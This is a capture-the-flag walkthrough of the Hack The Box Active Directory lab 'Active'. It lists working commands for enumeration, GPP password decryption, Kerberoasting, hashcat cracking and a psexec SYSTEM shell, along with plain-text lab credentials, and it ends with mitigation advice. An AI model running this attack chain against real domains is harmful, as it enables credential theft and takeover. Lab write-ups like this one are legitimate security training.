---
title: Active
date: 2025-04-23
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, GPP, Kerberoasting] 
image: active.webp
media_subpath: /assets/img/posts/2025-04-23-activeHTB/
---
## Introduction
In this walkthrough we will be solving Hack The Box Easy Active Directory box Active. Let’s start ..
## Nmap

### TCP

Run a quick Nmap scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n --open -v
```

![image.png](image%202.png)

## Services

### Port 53

Microsoft **DNS 6.1.7601** (1DB15D39) (Windows Server 2008 R2 SP1)

**Domain: active.htb**

- **/etc/hosts**
    
    Add domain and DC to `/etc/hosts` file:
    
    ![image.png](image%203.png)
    
- **dig any** DNS records
    
    ```bash
    dig any active.htb @$IP
    ```
    
    ![image.png](image%204.png)
    
- **Zone transfer**
    
    ```bash
    dig axfr @$IP active.htb
    ```
    
    ![image.png](image%205.png)
    
- **Public Exploits**
    
    ```bash
    searchsploit DNS 6.1
    ```
    
    **No result.**
    

### Port 139/445

I checked shares and my permissions over them.

```bash
sudo nxc smb $IP -u '' -p '' --shares
```

![image.png](image%206.png)

I couldn’t find anything in `Replication` share.

## Web
...

## AD Initial Enumeration

### User Enumeration

```bash
./kerbrute_linux_amd64 userenum -d active.htb --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 70
```

![image.png](image%207.png)

### Port 389/3268

```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -H ldap://$IP -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=active,DC=htb"
```

## Exploitation

## Loot

- [ ]  **Thoroughly check Replication share**
    
    `Let’s do this task, check replication share thoroughly`
    
    Let’s analyze files locally, we can map whole share to the local directory and run Python Web Server inside to analyze them quickly on the web, accessing `http://localhost`.
    
    ```bash
    RECURSE ON
    PROMPT OFF
    mget *
    python3 -m http.server 80
    ```
    
    ![image.png](image%208.png)
    

This GPP password, as it is located in Groups.xml under Policies.

I found this also in one of the cheatsheets that I am using:

[CheatSheet](https://gist.github.com/yezz123/52d2fc45c5de284ec89131c2a3dde389)

```
# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "
```
> GPP passwords are weakly encrypted with a known AES key and easily reversible.
{: .prompt-warning }

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![image.png](image%209.png)

Check the connection with netexec:

```bash
sudo nxc smb $IP -u SVC_TGS -d active.htb -p GPPstillStandingStrong2k18 --shares
```

## Privilege Escalation

![image.png](image%2010.png)

I checked all shares but found nothing.

As I have username and password I can try `Kerberoasting`:

```bash
GetUserSPNs.py -dc-ip $IP active.htb/SVC_TGS
```

We can see one Kerberoastable user, which is Administrator with CIFS SPN assigned, this is misconfiguration as high-privileged users shouldn’t be assigned SPNs.

```bash
GetUserSPNs.py -dc-ip $IP active.htb/SVC_TGS -request
```

![image.png](image%2011.png)

```bash
hashcat -m 13100 cifs.hash /usr/share/wordlists/rockyou.txt --force
```

![image.png](image%2012.png)

add this to credentials.

## Credentials

```bash
active.htb\SVC_TGS : GPPstillStandingStrong2k18
Administrator : Ticketmaster1968
```

Then I used this password with Administrator user and psexec give me NT Authority\System shell:

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

![image.png](image%2013.png)

## Mitigation

- **Remove Group Policy Preferences (GPP) Passwords**: Avoid storing credentials in GPP files like `Groups.xml`. These passwords are weakly encrypted with a known AES key and easily reversible. Instead, use secure deployment mechanisms such as LAPS (Local Administrator Password Solution) or managed service accounts.
- **Audit SMB Shares**: Restrict access to SYSVOL and other shared folders where sensitive configuration files might reside. Regularly audit share permissions to ensure only authorized users have access.
- **Secure Service Accounts**:
    - Avoid assigning SPNs (Service Principal Names) to high-privilege users like `Administrator`. Instead, use dedicated service accounts with limited privileges.
    - Rotate passwords frequently, especially for accounts with SPNs, and use long, complex passwords resistant to offline cracking.
- **Monitor and Detect Kerberoasting Attempts**: Deploy monitoring solutions to detect abnormal Kerberos TGS requests. Tools like Microsoft ATA, Defender for Identity, or SIEM alerts can help identify such behavior.
- **Limit Lateral Movement**: Restrict administrative shares and enforce segmentation to reduce the risk of privilege escalation via tools like `PsExec`.
